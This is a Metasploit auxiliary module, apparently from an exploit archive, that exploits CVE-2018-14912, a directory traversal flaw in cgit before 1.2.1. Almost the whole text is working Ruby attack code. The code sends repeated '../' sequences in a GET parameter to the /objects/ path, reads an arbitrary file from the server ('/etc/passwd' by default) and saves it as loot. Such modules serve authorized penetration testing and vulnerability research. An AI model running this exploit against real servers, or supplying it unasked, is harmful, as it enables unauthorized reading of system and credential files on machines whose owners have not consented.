# Author: Dhiraj Mishra
# Software: cgit
# Link: https://git.zx2c4.com/cgit/
# CVE: CVE-2018-14912
# This module exploits a directory traversal vulnerability which exists 
# in cgit < 1.2.1 cgit_clone_objects(), reachable when the configuration 
# flag enable-http-clone is set to 1 (default).
 
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;cgit Directory Traversal&#039;,
      &#039;Description&#039; => %q{
        This module exploits a directory traversal vulnerability which
        exists in cgit < 1.2.1 cgit_clone_objects(), reachable when the
        configuration flag enable-http-clone is set to 1 (default).
      },
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2018-14912&#039;],
          [&#039;URL&#039;, &#039;https://bugs.chromium.org/p/project-zero/issues/detail?id=1627&#039;],
          [&#039;EDB&#039;, &#039;45148&#039;]
        ],
      &#039;Author&#039;      =>
        [
          &#039;Google Project Zero&#039;, # Vulnerability discovery
          &#039;Dhiraj Mishra&#039; # Metasploit module
        ],
      &#039;DisclosureDate&#039; => &#039;Aug 03 2018&#039;,
      &#039;License&#039;     => MSF_LICENSE
    ))
 
    register_options(
      [
        OptString.new(&#039;FILEPATH&#039;, [true, "The path to the file to read", &#039;/etc/passwd&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true, "The base URI path of the cgit install", &#039;/cgit/&#039;]),
        OptString.new(&#039;REPO&#039;, [true, "Git repository on the remote server", &#039;&#039;]),
        OptInt.new(&#039;DEPTH&#039;, [ true, &#039;Depth for Path Traversal&#039;, 10 ])
      ])
  end
 
  def run_host(ip)
    filename = datastore[&#039;FILEPATH&#039;]
    traversal = "../" * datastore[&#039;DEPTH&#039;] << filename
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, datastore[&#039;REPO&#039;], &#039;/objects/&#039;),
      &#039;vars_get&#039; => {&#039;path&#039; => traversal}
    })
 
    unless res && res.code == 200
      print_error(&#039;Nothing was downloaded&#039;)
      return
    end
 
    vprint_good("#{peer} - \n#{res.body}")
    path = store_loot(
      &#039;cgit.traversal&#039;,
      &#039;text/plain&#039;,
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end

